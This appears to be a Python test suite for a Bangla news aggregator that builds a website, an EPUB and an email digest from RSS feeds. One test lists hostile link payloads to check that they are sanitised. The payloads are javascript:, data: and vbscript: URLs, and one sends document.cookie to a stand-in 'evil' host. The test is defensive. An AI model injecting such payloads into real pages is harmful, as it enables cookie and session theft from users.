"""Self-check for the non-trivial logic: dedup, cutoff filtering, section
resolution, tabbed/modal site rendering. No network calls -- feedparser.parse
and extract_meta are monkeypatched. Run with: python test_pipeline.py
"""
import json
import unicodedata
from datetime import datetime, timedelta, timezone
from types import SimpleNamespace
from unittest.mock import patch

import pipeline


def test_group_by_section_uses_hint_then_drops_unknown():
    articles = [
        {"section_hint": "Sports", "source": "A", "link": "l1", "author": "", "image": "", "published": None},
        {"section_hint": None, "source": "B", "link": "l2", "author": "", "image": "", "published": None},
        {"section_hint": None, "source": "C", "link": "l3", "author": "", "image": "", "published": None},
    ]
    results = [
        {"index": 0, "headline": "h0", "summary": "s0", "section": "Tech"},  # hint wins over this
        {"index": 1, "headline": "h1", "summary": "s1", "section": "Tech"},
        {"index": 2, "headline": "h2", "summary": "s2", "section": "Nonsense"},  # dropped
    ]
    grouped = pipeline.group_by_section(articles, results)
    assert len(grouped["Sports"]) == 1, grouped
    assert grouped["Sports"][0]["headline"] == "h0"
    assert len(grouped["Tech"]) == 1, grouped
    assert grouped["Tech"][0]["headline"] == "h1"
    assert sum(len(v) for v in grouped.values()) == 2, "unknown section must be dropped"
    print("ok: group_by_section")


def test_group_by_section_carries_author_image_time():
    dt = datetime(2026, 8, 13, 3, 0, tzinfo=timezone.utc)  # 09:00 BD
    articles = [{
        "section_hint": "Tech", "source": "Src", "link": "https://x",
        "author": " Jane Doe ", "image": "https://x/img.jpg", "published": dt.isoformat(),
    }]
    results = [{"index": 0, "headline": "h", "summary": "s", "section": "Tech"}]
    a = pipeline.group_by_section(articles, results)["Tech"][0]
    assert a["author"] == "Jane Doe"
    assert a["image"] == "https://x/img.jpg"
    assert a["time"], "published time must be converted to a Bangla time label"
    print("ok: group_by_section carries author/image/time")


def test_make_teaser_stops_at_first_sentence_and_caps_length():
    assert pipeline.make_teaser("পহেলা বাক্য। দ্রুতীয় বাক্য।") == "পহেলা বাক্য।"
    long_text = "word " * 100
    teaser = pipeline.make_teaser(long_text, max_chars=50)
    assert len(teaser) <= 52 and teaser.endswith("…")
    print("ok: make_teaser")


def test_fetch_new_entries_dedups_and_respects_cutoff():
    now = datetime(2024, 1, 2, 6, 0, tzinfo=timezone.utc)
    old = (now - timedelta(hours=48)).timetuple()
    fresh = (now - timedelta(hours=2)).timetuple()

    fake_feed = SimpleNamespace(bozo=False, entries=[
        {"link": "https://x/already-seen", "title": "seen", "published_parsed": fresh},
        {"link": "https://x/too-old", "title": "old", "published_parsed": old},
        {"link": "https://x/new-one", "title": "new", "published_parsed": fresh},
    ])
    source = {"name": "Test Source", "url": "https://x/feed", "section": "Tech"}
    state = {"Test Source": {"seen_urls": ["https://x/already-seen"]}}

    with patch.object(pipeline.feedparser, "parse", return_value=fake_feed), \
         patch.object(pipeline, "extract_meta", return_value={"text": "some article body", "author": "", "image": ""}):
        new_articles = pipeline.fetch_new_entries(source, state, now, set())

    links = {a["link"] for a in new_articles}
    assert links == {"https://x/new-one"}, links
    print("ok: fetch_new_entries dedup + cutoff")


def test_fetch_new_entries_skips_urls_already_seen_this_run():
    """Some outlets (BBC Bangla) are listed both as a topic feed and as
    their general mixed feed; a shared seen_this_run set stops the same
    article being captured twice with two different sections."""
    now = datetime(2024, 1, 2, 6, 0, tzinfo=timezone.utc)
    fresh = (now - timedelta(hours=1)).timetuple()
    fake_feed = SimpleNamespace(bozo=False, entries=[
        {"link": "https://x/already-this-run", "title": "t", "published_parsed": fresh},
    ])
    source = {"name": "Test Source", "url": "https://x/feed", "section": "Tech"}
    seen_this_run = {"https://x/already-this-run"}

    with patch.object(pipeline.feedparser, "parse", return_value=fake_feed), \
         patch.object(pipeline, "extract_meta", return_value={"text": "body", "author": "", "image": ""}):
        new_articles = pipeline.fetch_new_entries(source, {}, now, seen_this_run)
    assert new_articles == []
    print("ok: fetch_new_entries skips urls already seen this run")


def test_classify_by_link():
    assert pipeline.classify_by_link("https://www.prothomalo.com/sports/cricket/8fdqj2xuxp") == "Sports"
    assert pipeline.classify_by_link("https://www.prothomalo.com/technology/xyz") == "Tech"
    assert pipeline.classify_by_link("https://www.prothomalo.com/entertainment/xyz") == "Entertainment"
    assert pipeline.classify_by_link("https://www.prothomalo.com/world/xyz") == "International"
    assert pipeline.classify_by_link("https://www.prothomalo.com/bangladesh/xyz") is None, \
        "unmapped path segments fall through to the Local fallback, not a wrong guess"
    assert pipeline.classify_by_link("https://www.banglanews24.com/news/123") is None, \
        "opaque numeric-id paths carry no signal"
    assert pipeline.classify_by_link(None) is None
    assert pipeline.classify_by_link("") is None
    print("ok: classify_by_link")


def test_collect_results_uses_url_path_when_source_has_no_section_hint():
    articles = [
        {"title": "h", "text": "body", "section_hint": None, "link": "https://x/sports/1"},
        {"title": "h", "text": "body", "section_hint": None, "link": "https://x/news/1"},
        {"title": "h", "text": "body", "section_hint": "Tech", "link": "https://x/sports/1"},
    ]
    results = pipeline.collect_results(articles)
    assert results[0]["section"] == "Sports", "mixed feed, but the URL says sports"
    assert results[1]["section"] == "Local", "no signal anywhere -- Local fallback"
    assert results[2]["section"] == "Tech", "a real section_hint always wins over the URL guess"
    print("ok: collect_results uses url path when source has no section hint")


def test_build_epub_smoke():
    import tempfile
    from pathlib import Path
    grouped = {s: [] for s in pipeline.SECTIONS}
    grouped["Tech"] = [{"headline": "শিরোনাম", "excerpt": "সারাংশ", "source": "Src",
                        "link": "https://x", "author": "লেখক", "image": "", "time": "সকাল ৯:০০"}]
    out = Path(tempfile.mkdtemp()) / "t.epub"
    pipeline.build_epub(grouped, datetime.now(timezone.utc), out)
    assert out.exists() and out.stat().st_size > 0
    print("ok: build_epub smoke test")


def test_retry_succeeds_after_transient_failures():
    calls = {"n": 0}

    def flaky():
        calls["n"] += 1
        if calls["n"] < 3:
            raise ValueError("transient")
        return "ok"

    with patch.object(pipeline.time, "sleep", return_value=None):
        assert pipeline.retry(flaky, what="test", attempts=3, backoff=1) == "ok"
    assert calls["n"] == 3
    print("ok: retry recovers from transient failures")


def test_retry_raises_after_exhausting_attempts():
    def always_fails():
        raise ValueError("permanent")

    with patch.object(pipeline.time, "sleep", return_value=None):
        try:
            pipeline.retry(always_fails, what="test", attempts=2, backoff=1)
            assert False, "should have raised"
        except ValueError:
            pass
    print("ok: retry raises after exhausting attempts")


def test_collect_results_strips_headline_repeated_in_body():
    title = "খেলোয়াড়দের সংবাদ"
    decomposed = unicodedata.normalize("NFD", title)
    assert decomposed != title, "fixture must actually differ byte-wise"

    articles = [
        {"title": "শিরোনাম", "text": "শিরোনাম\nশিরোনাম\nআসল লেখা এখানে।", "section_hint": "Tech"},
        {"title": "Only The Title", "text": "Only The Title", "section_hint": "Tech"},
        {"title": title, "text": decomposed + "\nমূল প্রতিবেদন।", "section_hint": "Tech"},
        {"title": "খবর", "text": "সম্পূর্ণ আলাদা লেখা।", "section_hint": "Tech"},
    ]
    results = pipeline.collect_results(articles)
    assert results[0]["summary"] == "আসল লেখা এখানে।", results[0]["summary"]
    assert results[1]["summary"] == "Only The Title", "body that is nothing but the headline still shows something"
    assert results[2]["summary"] == "মূল প্রতিবেদন।", results[2]["summary"]
    assert results[3]["summary"] == "সম্পূর্ণ আলাদা লেখা।", "body that never repeats the headline is untouched"
    print("ok: collect_results strips repeated headline")


def test_collect_results_uses_raw_title_and_excerpt():
    articles = [
        {"title": "Some Headline", "text": "a" * 500, "section_hint": None},
        {"title": "", "text": "short body", "section_hint": "Tech"},
    ]
    results = pipeline.collect_results(articles)
    assert results[0]["headline"] == "Some Headline"
    assert results[0]["summary"].endswith("…")
    assert results[0]["section"] == "Local", "no hint -> defaults to Local, not crash"
    assert results[1]["headline"], "missing title still gets a placeholder, not empty"
    assert results[1]["section"] == "Tech", "hinted section passed through untouched"
    print("ok: collect_results")


def test_feed_links_are_scheme_restricted():
    """Feeds are untrusted. A javascript:/data: link must never reach an href
    on the published site, in the EPUB, or in subscriber email."""
    hostile = [
        "javascript:fetch('https://evil/?c='+document.cookie)",
        "JaVaScRiPt:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "vbscript:msgbox",
        "  javascript:alert(1)  ",
        None,
    ]
    for bad in hostile:
        assert pipeline.safe_url(bad) == "", f"must be dropped: {bad!r}"
    for good in ["https://x.com/a?b=1&c=2", "http://x.com", "  https://x.com  "]:
        assert pipeline.safe_url(good) == good.strip(), good

    articles = [{"section_hint": "Tech", "source": "Evil Feed", "link": "javascript:alert(1)",
                "author": "", "image": "javascript:alert(2)", "published": None}]
    results = [{"index": 0, "headline": "h", "summary": "s", "section": "Tech"}]
    grouped = pipeline.group_by_section(articles, results)
    assert grouped["Tech"][0]["link"] == "", "sanitized early, at the funnel every renderer is fed from"
    assert grouped["Tech"][0]["image"] == "", "image src is sanitized the same way as the article link"

    run_dt = datetime(2026, 8, 12, 1, 0, tzinfo=timezone.utc)

    import tempfile
    from pathlib import Path
    epub_out = Path(tempfile.mkdtemp()) / "t.epub"
    pipeline.build_epub(grouped, run_dt, epub_out)
    outputs = {
        "run page": pipeline.render_run_html(grouped, run_dt),
        "email": pipeline.render_email_html(grouped, run_dt),
        "epub": epub_out.read_bytes().decode("utf8", "ignore"),
    }
    for name, out in outputs.items():
        assert "javascript:" not in out.lower(), f"{name} leaked a javascript: URL"
        assert 'href=""' not in out, f"{name} emitted an empty href instead of dropping the link"
    assert "Evil Feed" in outputs["run page"], "source is still credited without a link"
    print("ok: feed links are scheme-restricted")


def _article(headline, source="Src", link="https://x", **extra):
    a = {"headline": headline, "excerpt": "সারাংশ", "source": source, "link": link,
        "author": "", "image": "", "time": ""}
    a.update(extra)
    return a


def test_render_run_html_is_headline_only_and_escaped():
    grouped = {s: [] for s in pipeline.SECTIONS}
    grouped["Local"] = [_article("শিরোনাম ১ & Q<A", link="https://x?a=1&b=2")]
    run_dt = datetime(2026, 8, 12, 0, 30, tzinfo=timezone.utc)  # 06:30 BD -> morning
    html = pipeline.render_run_html(grouped, run_dt)
    assert "&amp;" in html and "Q&lt;A" in html, "headlines/links must be HTML-escaped"
    assert "সকালের" in html, "morning edition label"
    assert 'href="https://x?a=1&amp;b=2"' in html, "headline links straight to the source"
    assert "class=modal" not in html, "the static permalink page has no interactive modal"
    print("ok: render_run_html")


def test_render_index_tabs_default_to_latest_edition():
    grouped_morning = {s: [] for s in pipeline.SECTIONS}
    grouped_morning["Local"] = [_article("দুপুরের আগের খবর")]
    grouped_evening = {s: [] for s in pipeline.SECTIONS}
    grouped_evening["Tech"] = [_article("সান্ধ্য খবর", author="লেখক", image="https://x/i.jpg", time="সন্ধ্যা ৬:০০")]

    manifest = [
        {"dt": datetime(2026, 8, 12, 12, 5, tzinfo=timezone.utc).isoformat(),  # 18:05 BD -> evening, newest
         "file": "runs/a.html", "counts": {"Tech": 1}, "grouped": grouped_evening},
        {"dt": datetime(2026, 8, 12, 0, 30, tzinfo=timezone.utc).isoformat(),  # 06:30 BD -> morning
         "file": "runs/b.html", "counts": {"Local": 1}, "grouped": grouped_morning},
    ]
    index = pipeline.render_index(manifest)

    assert '<input type=radio name=ed id=ed0 class=vh checked>' in index, "latest edition tab is checked by default"
    assert "সান্ধ্য সংস্করণ" in index and "সকালের সংস্করণ" in index, "both tabs present"
    assert 'data-headline="সান্ধ্য খবর"' in index, "row carries its data for the modal"
    assert 'data-author="লেখক"' in index and 'data-image="https://x/i.jpg"' in index
    assert "<p>সারাংশ</p>" not in index, "no inline description -- headline only, detail lives in the modal"
    assert '<dialog id=modal' in index, "shared modal present"
    assert index.count("body:has(#ed") == 2, "one .horizon colour rule generated per tab"
    print("ok: render_index tabs default to latest edition")


def test_render_index_single_edition_has_no_tab_bar():
    grouped = {s: [] for s in pipeline.SECTIONS}
    grouped["Sports"] = [_article("একটি খবর")]
    manifest = [{"dt": datetime(2026, 8, 12, 0, 30, tzinfo=timezone.utc).isoformat(),
                "file": "runs/a.html", "counts": {"Sports": 1}, "grouped": grouped}]
    index = pipeline.render_index(manifest)
    assert "role=tablist" not in index, "a single edition doesn't need a tab bar"
    assert 'id=ed0' in index, "the CSS-only panel switch still needs its radio"
    print("ok: render_index single edition")


def test_render_index_empty_manifest():
    index = pipeline.render_index([])
    assert "কোনো সংস্করণ" in index
    print("ok: render_index empty manifest")


def test_parse_recipients_handles_separators_and_whitespace():
    raw = "a@x.com, b@y.com;\nc@z.com ,, "
    assert pipeline.parse_recipients(raw) == ["a@x.com", "b@y.com", "c@z.com"]
    print("ok: parse_recipients")


def test_edition_four_buckets_centred_on_scheduled_hours():
    bd = lambda h, m=0: datetime(2026, 1, 1, h, m, tzinfo=pipeline.BD_TZ)
    assert pipeline.edition(bd(6))[1] == "morning"
    assert pipeline.edition(bd(12))[1] == "noon"
    assert pipeline.edition(bd(18))[1] == "evening"
    assert pipeline.edition(bd(0))[1] == "night"
    # +/- a few minutes of CI scheduling drift must not flip the bucket
    assert pipeline.edition(bd(5, 40))[1] == "morning"
    assert pipeline.edition(bd(23, 50))[1] == "night"
    assert pipeline.edition(bd(2, 55))[1] == "night", "just before 03:00 is still last night's bucket"
    print("ok: edition four buckets")


def test_todays_editions_filters_to_newest_calendar_date():
    """Manifest can (briefly, pre-prune) hold runs from two different BD
    dates -- the index must only ever show the newest date's, capped at 4."""
    mk = lambda h, day=13: {"dt": datetime(2026, 8, day, h, 0, tzinfo=timezone.utc).isoformat(),
                            "file": "r.html", "counts": {}, "grouped": {}}
    manifest = [
        mk(18, day=13),  # 2026-08-14 00:00 BD -- newest, night edition of the 14th
        mk(12, day=13),  # 2026-08-13 18:00 BD -- previous date, not yet pruned
        mk(6, day=13),   # 2026-08-13 12:00 BD -- previous date
        mk(0, day=13),   # 2026-08-13 06:00 BD -- previous date
    ]
    todays = pipeline._todays_editions(manifest)
    assert len(todays) == 1, "only the one run on the newest date should show"
    assert pipeline._todays_editions([]) == []
    print("ok: _todays_editions filters by newest calendar date")


def test_update_site_prunes_on_the_night_edition_not_morning():
    """Night (~00:00 BD) is chronologically the first of each date's four
    runs, so it's the one that should reset retention -- not morning."""
    import tempfile
    from pathlib import Path
    from unittest.mock import patch

    site = Path(tempfile.mkdtemp())
    grouped = {s: [] for s in pipeline.SECTIONS}
    old_run = datetime(2026, 8, 12, 12, 0, tzinfo=timezone.utc)   # 18:00 BD Aug 12 -- evening
    night_run = datetime(2026, 8, 12, 18, 0, tzinfo=timezone.utc)  # 00:00 BD Aug 13 -- night

    with patch.object(pipeline, "SITE_DIR", site), patch.object(pipeline, "RUNS_MANIFEST", site / "runs.json"):
        pipeline.update_site(grouped, old_run)
        pipeline.update_site(grouped, night_run)
        manifest = json.loads((site / "runs.json").read_text())

    assert len(manifest) == 1, "the night run must have pruned the previous date's run"
    assert manifest[0]["dt"] == night_run.isoformat()
    print("ok: update_site prunes on the night edition")


if __name__ == "__main__":
    test_group_by_section_uses_hint_then_drops_unknown()
    test_group_by_section_carries_author_image_time()
    test_fetch_new_entries_dedups_and_respects_cutoff()
    test_fetch_new_entries_skips_urls_already_seen_this_run()
    test_classify_by_link()
    test_collect_results_uses_url_path_when_source_has_no_section_hint()
    test_build_epub_smoke()
    test_make_teaser_stops_at_first_sentence_and_caps_length()
    test_retry_succeeds_after_transient_failures()
    test_retry_raises_after_exhausting_attempts()
    test_collect_results_uses_raw_title_and_excerpt()
    test_collect_results_strips_headline_repeated_in_body()
    test_render_run_html_is_headline_only_and_escaped()
    test_render_index_tabs_default_to_latest_edition()
    test_render_index_single_edition_has_no_tab_bar()
    test_render_index_empty_manifest()
    test_feed_links_are_scheme_restricted()
    test_parse_recipients_handles_separators_and_whitespace()
    test_edition_four_buckets_centred_on_scheduled_hours()
    test_todays_editions_filters_to_newest_calendar_date()
    test_update_site_prunes_on_the_night_edition_not_morning()
    print("all tests passed")
